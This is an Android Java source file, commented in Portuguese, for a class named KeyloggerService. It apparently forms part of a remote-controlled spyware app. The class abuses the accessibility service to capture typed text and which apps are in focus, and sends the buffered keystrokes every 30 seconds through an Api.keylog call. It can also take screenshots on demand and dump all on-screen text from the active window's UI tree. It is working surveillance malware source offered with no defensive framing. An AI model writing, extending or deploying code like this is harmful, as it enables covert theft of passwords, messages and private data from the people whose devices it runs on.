package com.kl.logger;

import android.accessibilityservice.*;
import android.graphics.Bitmap;
import android.os.*;
import android.view.accessibility.*;
import java.util.concurrent.*;
import java.util.function.Consumer;

/**
 * Serviço de acessibilidade — cobre:
 *   - Keylog: captura texto de cada evento AccessibilityEvent
 *   - Screenshot: takeScreenshot() via API 30+
 *   - A11y tree dump: percorre getRootInActiveWindow()
 *   - Lock screen: performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN)
 */
public class KeyloggerService extends AccessibilityService {

    public static volatile KeyloggerService INSTANCE;

    // buffer circular de keystrokes (máx 60 KB)
    private final StringBuilder hist = new StringBuilder();
    private static final int MAX_HIST = 60_000;
    private static final int TRIM_TO  = 40_000;

    // flush periódico a cada 30 s quando há conteúdo novo
    private final Handler timer  = new Handler(Looper.getMainLooper());
    private boolean dirty = false;
    private final Runnable flusher = new Runnable() {
        @Override public void run() {
            if (dirty) flush();
            timer.postDelayed(this, 30_000);
        }
    };

    // ---- lifecycle --------------------------------------------------------

    @Override
    public void onServiceConnected() {
        INSTANCE = this;
        timer.postDelayed(flusher, 30_000);
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        INSTANCE = null;
        timer.removeCallbacks(flusher);
        super.onDestroy();
    }

    // ---- keylog -----------------------------------------------------------

    @Override
    public void onAccessibilityEvent(AccessibilityEvent e) {
        if (e == null) return;
        CharSequence text = null;

        switch (e.getEventType()) {
            case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                // captura caractere novo (diff simples)
                if (!e.getText().isEmpty()) {
                    text = e.getText().get(0);
                }
                break;
            case AccessibilityEvent.TYPE_VIEW_FOCUSED:
            case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                // log de foco: nome do pacote + activity
                if (e.getPackageName() != null) {
                    append("[focus] " + e.getPackageName() + " / " + e.getClassName());
                }
                break;
            default:
                return;
        }

        if (text != null && text.length() > 0) {
            append(text.toString());
        }
    }

    private void append(String s) {
        synchronized (hist) {
            hist.append(s).append('\n');
            dirty = true;
            if (hist.length() > MAX_HIST) {
                hist.delete(0, hist.length() - TRIM_TO);
            }
        }
    }

    private void flush() {
        String chunk;
        synchronized (hist) {
            if (!dirty || hist.length() == 0) return;
            chunk = hist.toString();
            hist.setLength(0);
            dirty = false;
        }
        Api.keylog(this, chunk);
    }

    /** Chamado pelo Modules para dump sob demanda. */
    public String dumpLog() {
        synchronized (hist) {
            String s = hist.toString();
            hist.setLength(0);
            dirty = false;
            return s.isEmpty() ? "(sem keystrokes)" : s;
        }
    }

    // ---- screenshot -------------------------------------------------------

    /**
     * Captura o display default e chama o callback com o Bitmap resultante.
     * API 30+. O Poller/Modules deve verificar Build.VERSION.SDK_INT >= 30.
     */
    public void shot(Consumer<Bitmap> cb) {
        if (Build.VERSION.SDK_INT < 30) {
            cb.accept(null);
            return;
        }
        takeScreenshot(
            android.view.Display.DEFAULT_DISPLAY,
            getMainExecutor(),
            new TakeScreenshotCallback() {
                @Override
                public void onSuccess(ScreenshotResult r) {
                    Bitmap bmp = Bitmap.wrapHardwareBuffer(
                            r.getHardwareBuffer(), r.getColorSpace());
                    cb.accept(bmp);
                }
                @Override
                public void onFailure(int code) {
                    cb.accept(null);
                }
            }
        );
    }

    // ---- a11y tree --------------------------------------------------------

    public String dumpTree() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return "(sem janela ativa)";
        StringBuilder sb = new StringBuilder();
        walk(root, 0, sb);
        return sb.toString();
    }

    private void walk(AccessibilityNodeInfo node, int depth, StringBuilder sb) {
        if (node == null || depth > 16) return;
        for (int i = 0; i < depth; i++) sb.append("  ");
        sb.append(node.getClassName());
        if (node.getViewIdResourceName() != null)
            sb.append('#').append(node.getViewIdResourceName());
        if (node.getText() != null && node.getText().length() > 0)
            sb.append(" = \"").append(node.getText()).append('"');
        if (node.getContentDescription() != null && node.getContentDescription().length() > 0)
            sb.append(" [").append(node.getContentDescription()).append(']');
        sb.append('\n');
        for (int i = 0; i < node.getChildCount(); i++) {
            walk(node.getChild(i), depth + 1, sb);
        }
    }
}
